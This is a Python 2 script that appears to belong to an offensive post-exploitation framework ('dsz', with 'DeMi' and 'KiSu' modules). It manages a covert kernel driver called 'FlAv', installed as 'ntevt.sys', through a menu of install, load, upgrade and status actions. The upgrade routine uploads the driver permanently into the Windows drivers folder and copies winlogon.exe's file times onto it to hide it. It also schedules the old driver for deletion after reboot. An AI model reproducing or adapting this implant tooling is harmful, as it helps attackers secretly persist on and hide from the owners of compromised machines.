import dsz
import dsz.lp
import dsz.menu
import dsz.user

import datetime
import socket
import sys
import xml.dom.minidom

import dsz.windows.driver
try:
	dsz.lp.AddResDirToPath("DeMi")
	import demi
	import demi.registry
	import demi.windows.driver
	bNoDemi = False
except:
	bNoDemi = True


Action = "action"
Method = "method"
Quiet = "quiet"
Silent = "silent"
Driver = "driver"

Verbose = "verbose"
Project = "Project"
LocalName = "LocalName"
DriverName = "DriverName"
ModuleId = "ModuleId"
ModuleOrder = "ModulerOrder"
Version = "Version"

#------------------------------------------------------------------------------------------
def main():

	cmdParams = dsz.lp.cmdline.ParseCommandLine(sys.argv, "_FlAv.txt")
	if (len(cmdParams) == 0):
		return False

	try:
		params = dict()

		params[Project] = "FlAv"
		params[LocalName] = "ntevt.sys"
		params[Version] = GetProjectVersion(params)
		try:
			params[DriverName] = demi.registry.FLAV.Name
			params[ModuleId] = demi.registry.FLAV.Id
		except:
			params[DriverName] = "ntevt"
		params[ModuleOrder] = 1

		params[Verbose] = False
		params[Quiet] = False
		params[Silent] = False

		if (Driver in cmdParams):
			if not (cmdParams[Driver] == ['t', 'r', 'u', 'e'] or cmdParams[Driver][0] == "true"):
				params[DriverName] = cmdParams[Driver][0]	
 
		if (Method in cmdParams):
			params[Method] = cmdParams[Method][0]

		if (Verbose in cmdParams):
			params[Verbose] = True

		if (Quiet in cmdParams):
			params[Quiet] = True
		
		if (Silent in cmdParams):
			params[Silent] = True

		#dsz.ui.Echo("%s" % (params))		

		if not (Action in cmdParams):
			menuItems = list()
			
			menuItems.append(dict({dsz.menu.Name : "Install tools", dsz.menu.Parameter : params, dsz.menu.Function : InstallTools}))
			menuItems.append(dict({dsz.menu.Name : "Uninstall tools", dsz.menu.Parameter : params, dsz.menu.Function : UninstallTools}))
			menuItems.append(dict({dsz.menu.Name : "Upgrade tools", dsz.menu.Parameter : params, dsz.menu.Function : UpgradeTools}))
			menuItems.append(dict({dsz.menu.Name : "Load driver", dsz.menu.Parameter : params, dsz.menu.Function : LoadDriver}))
			menuItems.append(dict({dsz.menu.Name : "Unload driver", dsz.menu.Parameter : params, dsz.menu.Function : UnloadDriver}))
			menuItems.append(dict({dsz.menu.Name : "Verify Install", dsz.menu.Parameter : params, dsz.menu.Function : VerifyInstall}))
			menuItems.append(dict({dsz.menu.Name : "Verify driver is running", dsz.menu.Parameter : params, dsz.menu.Function : VerifyRunning}))
			menuItems.append(dict({dsz.menu.Name : "Check driver status", dsz.menu.Parameter : params, dsz.menu.Function : CheckDriverStatus}))

			bContinue = True
			while bContinue:
				(ret, choice) = dsz.menu.ExecuteSimpleMenu("%s Control" % (params[Version]), menuItems)
				if (ret == ""):
					bContinue = False
				else:
					dsz.ui.Pause()
			return True
		elif cmdParams[Action][0].lower() == "install":
			return InstallTools(params)
		elif cmdParams[Action][0].lower() == "uninstall":
			return UninstallTools(params)
		elif cmdParams[Action][0].lower() == "upgrade":
			return UpgradeTools(params)
		elif cmdParams[Action][0].lower() == "verifyinstall":
			return VerifyInstall(params)
		elif cmdParams[Action][0].lower() == "verifyrunning":
			return VerifyRunning(params)
		elif cmdParams[Action][0].lower() == "load":
			return LoadDriver(params)
		elif cmdParams[Action][0].lower() == "unload":
			return UnloadDriver(params)
		elif cmdParams[Action][0].lower() == "status":
			return CheckDriverStatus(params)
		
	except RuntimeError, err:
		dsz.ui.Echo("%s" % err, dsz.ERROR)
		return False
		
	return True

#------------------------------------------------------------------------------------------
def InstallTools(params, ask=None):
	bAsk = ask
	if bAsk == None:
		bAsk = not params[Quiet]
	if (IsKiSuEnabled(params)):
		return demi.windows.driver.Install(params[Project],
										   params[DriverName],
										   params[LocalName],
										   2,
										   1,
										   params[ModuleId],
										   params[ModuleOrder],
										   bAsk)
	else:
		return dsz.windows.driver.Install(params[Project],
										  params[DriverName],
										  params[LocalName],
										  2,
										  1,
										  bAsk)
		

#------------------------------------------------------------------------------------------
def UninstallTools(params, ask=None):
	bAsk = ask
	if bAsk == None:
		bAsk = not params[Quiet]
	if (IsKiSuEnabled(params)):
#		return demi.windows.driver.Uninstall(params[Project],
#											 params[DriverName],
#											 params[ModuleId],
#											 bAsk)
		return uninstallFromKisu(params[Project],
								 params[DriverName],
								 params[ModuleId],
								 bAsk)
	else:
		return dsz.windows.driver.Uninstall(params[Project],
											params[DriverName],
											bAsk)
											
#--------------------------------------------------------------------------
def uninstallFromKisu(project, driverName, moduleId, ask=True):
	
	# record current flags and turn echo'ing off / disablewow64
	x = dsz.control.Method()
	dsz.control.echo.Off()
	rtn = True

	if (len(driverName) == 0):
		dsz.ui.Echo("Invalid driver name given", dsz.ERROR)
		return False

	# if not demi.windows.driver.CheckIsRunning():
		# return False
	if not demi.windows.driver.VerifyInstall(driverName,
											 moduleId,
											 2,
											 1):
		return False

	if (ask and (not dsz.ui.Prompt("Do you want to uninstall the %s driver (%s.sys)?" % (project, driverName)))):
		return False
		
	dsz.ui.Echo("Removing module from KiSu store")	
	if dsz.cmd.Run("kisu_deletemodule -id %d" % (moduleId)):
		dsz.ui.Echo("    SUCCESS", dsz.GOOD)
		return rtn
	else:
		dsz.ui.Echo("    FAILED", dsz.ERROR)
		return False
		

#------------------------------------------------------------------------------------------
def UpgradeTools(params, ask=None):
	bAsk = ask
	if bAsk == None:
		bAsk = not params[Quiet]
	if (IsKiSuEnabled(params)):
		return demi.windows.driver.ReplaceDriver(params[Project] + "Test",
												 params[DriverName],
												 params[ModuleId],
												 bAsk)
	else:
		return DszReplaceDriver(params[Project] + "Test",
								params[DriverName],
								bAsk)
		
#------------------------------------------------------------------------------------------
def LoadDriver(params):
	if (IsKiSuEnabled(params)):
		return demi.windows.driver.Load(params[DriverName],
										params[ModuleId])
	else:
		return dsz.windows.driver.Load(params[DriverName])

#------------------------------------------------------------------------------------------
def UnloadDriver(params):
	if (IsKiSuEnabled(params)):
		return demi.windows.driver.Unload(params[DriverName],
										  params[ModuleId])
	else:
		return dsz.windows.driver.Unload(params[DriverName])


#------------------------------------------------------------------------------------------
def VerifyInstall(params):
	if (IsKiSuEnabled(params)):
		return demi.windows.driver.VerifyInstall(params[DriverName],
												 params[ModuleId],
												 2,
												 1)
	else:
		return dsz.windows.driver.VerifyInstall(params[DriverName],
												2,
												1)

#------------------------------------------------------------------------------------------
def VerifyRunning(params):
	dsz.control.echo.Off()
	if (IsKiSuEnabled(params)):
		demi.windows.driver.VerifyRunning(params[DriverName],
										  params[ModuleId])
		# DEMI does not support this method, though it's invoked anyway
		dsz.ui.Echo("Checking for presence of FLAV via control plugin")
		if (dsz.cmd.Run('flav_control -status')):
			dsz.ui.Echo("    SUCCESS", dsz.GOOD)
			return True
		else:
			dsz.ui.Echo("    FAILURE", dsz.ERROR)
			return False
			
		#return demi.windows.driver.VerifyRunning(params[DriverName],
		#										 params[ModuleId])
	else:
		return dsz.windows.driver.VerifyRunning(params[DriverName])

#------------------------------------------------------------------------------------------
def CheckDriverStatus(params):
	dsz.control.echo.Off()
	bSuccess = True
	if not dsz.cmd.Run("stopaliasing flav_control -status", dsz.RUN_FLAG_RECORD):
		dsz.ui.Echo("\n**** UNABLE TO GET DRIVER STATUS ****", dsz.ERROR)
		bSuccess = False
	else:
		try:
			major = dsz.cmd.data.Get("status::major", dsz.TYPE_INT)[0]
			minor = dsz.cmd.data.Get("status::minor", dsz.TYPE_INT)[0]
			fix   = dsz.cmd.data.Get("status::fix",   dsz.TYPE_INT)[0]
			build = dsz.cmd.data.Get("status::build", dsz.TYPE_INT)[0]
			avail = dsz.cmd.data.Get("status::available", dsz.TYPE_BOOL)[0]

			dsz.ui.Echo("    Driver Version : %d.%d.%d.%d" % (major, minor, fix, build))
			dsz.ui.Echo("         Available : %s" % ("true" if avail else "false"))
		except:
			dsz.ui.Echo("\n**** UNABLE TO GET DRIVER STATUS****", dsz.ERROR)
			bSuccess = False

	if not dsz.cmd.Run("stopaliasing flav_control -ipconfig", dsz.RUN_FLAG_RECORD):
		dsz.ui.Echo("\n**** UNABLE TO GET DRIVER IPCONFIG ****", dsz.ERROR)
		bSuccess = False
	else:
		try:
			str = dsz.cmd.data.Get("Output::string", dsz.TYPE_STRING)[0]
			dsz.ui.Echo(str)
		except:
			dsz.ui.Echo("\n**** UNABLE TO GET DRIVER IPCONFIG ****", dsz.ERROR)
			bSuccess = False

	if not bSuccess and params[Quiet]:
		return False
	return True

#------------------------------------------------------------------------------------------
def GetProjectVersion(params):
	try:
		resDir = dsz.lp.GetResourcesDirectory()
		xmlFile = "%s/FlAv/Version/FlAv_Version.xml" % (resDir)
		doc = xml.dom.minidom.parse(xmlFile)
		verNode = doc.getElementsByTagName("Version").item(0)
		verStr = ""
		for n in verNode.childNodes:
			if n.nodeType == xml.dom.Node.TEXT_NODE:
				verStr = "%s%s" % (verStr, n.data)
		return verStr		
	except:
		raise
		return "FlAv 0.0.0.0"

#------------------------------------------------------------------------------------------
def IsKiSuEnabled(params):
	if (Method in params):
		if params[Method].lower() == "dsz":
			return False
		if params[Method].lower() == "demi":
			if (bNoDemi):
				dsz.ui.Echo(" DeMi is not installed on this LP", dsz.ERROR)
				# abort -now-.  We don't want to do the standard action.
				sys.exit(-1)
			return True
	if bNoDemi:
		return False
	return demi.UseKiSu()

#------------------------------------------------------------------------------------------
def DszReplaceDriver(project, drvName, ask=True):
	x = dsz.control.Method()
	dsz.control.echo.Off()
	systemRoot = dsz.path.windows.GetSystemPath()

	tmpName = "%s32.sys" % (drvName)

	# first, move existing driver
	dsz.ui.Echo("Move existing driver")
	if not dsz.cmd.Run('move "%s\\drivers\\%s.sys" "%s\\drivers\\%s"' % (systemRoot, drvName, systemRoot, tmpName)):
		dsz.ui.Echo("    FAILED", dsz.ERROR)
		return False
	dsz.ui.Echo("    MOVED", dsz.GOOD)

	# put the new driver
	dsz.ui.Echo("Uploading the SYS file")
	if not dsz.cmd.Run('put "%s.sys" -name "%s\\drivers\\%s.sys" -permanent -project %s' % (drvName, systemRoot, drvName, project)):
		dsz.ui.Echo("    FAILED", dsz.ERROR)
		dsz.cmd.Run('move "%s\\drivers\\%s.sys" "%s\\drivers\\%s"' % (systemRoot, tmpName, systemRoot, drvName))
		return False
	dsz.ui.Echo("    SUCCESS", dsz.GOOD)

	#match file times for driver
	if dsz.version.checks.IsOs64Bit():
		matchFile = "%s\\winlogon.exe" % (systemRoot)
	else:
		matchFile = "%s\\user.exe" % (systemRoot)

	dsz.ui.Echo("Matching file times for %s.sys with %s" % (drvName, matchFile))
	if dsz.cmd.Run('matchfiletimes -src "%s" -dst "%s\\drivers\\%s.sys"' %(matchFile, systemRoot, drvName)):
		dsz.ui.Echo("    MATCHED", dsz.GOOD)
	else:
		dsz.ui.Echo("    FAILED", dsz.WARNING)
		
	dsz.ui.Echo("Matching file times for %s with %s" % (tmpName, matchFile))
	if dsz.cmd.Run('matchfiletimes -src "%s" -dst "%s\\drivers\\%s"' %(matchFile, systemRoot, tmpName)):
		dsz.ui.Echo("    MATCHED", dsz.GOOD)
	else:
		dsz.ui.Echo("    FAILED", dsz.WARNING)

	# mark existing driver for delete
	dsz.ui.Echo("Deleting existing driver")
	if dsz.cmd.Run('delete -file "%s\\drivers\\%s" -afterreboot' % (systemRoot, tmpName)):
		dsz.ui.Echo("    MOVED", dsz.GOOD)
	else:
		dsz.ui.Echo("    FAILED", dsz.ERROR)

	dsz.ui.Echo("Upgrade complete (reboot required)")
	return True


#------------------------------------------------------------------------------------------
if __name__ == '__main__':
	if (main() != True):
		sys.exit(-1);
